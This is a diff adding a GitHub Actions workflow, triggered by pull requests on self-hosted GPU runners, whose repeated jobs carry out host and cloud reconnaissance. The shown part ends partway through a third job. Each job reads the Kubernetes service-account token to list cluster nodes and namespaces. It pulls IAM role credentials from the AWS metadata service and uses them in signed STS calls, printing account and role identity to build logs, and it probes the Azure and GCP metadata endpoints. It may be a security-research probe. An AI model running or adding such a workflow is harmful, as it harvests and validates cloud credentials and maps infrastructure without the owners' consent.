@@ -1,0 +1,2257 @@
+name: c211-i124924-dense
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  b200-a:
+    runs-on: 4-gpu-b200
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: b200-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  b200-b:
+    runs-on: 4-gpu-b200
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: b200-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  b200k-a:
+    runs-on: 4-gpu-b200-kernel
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: b200k-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
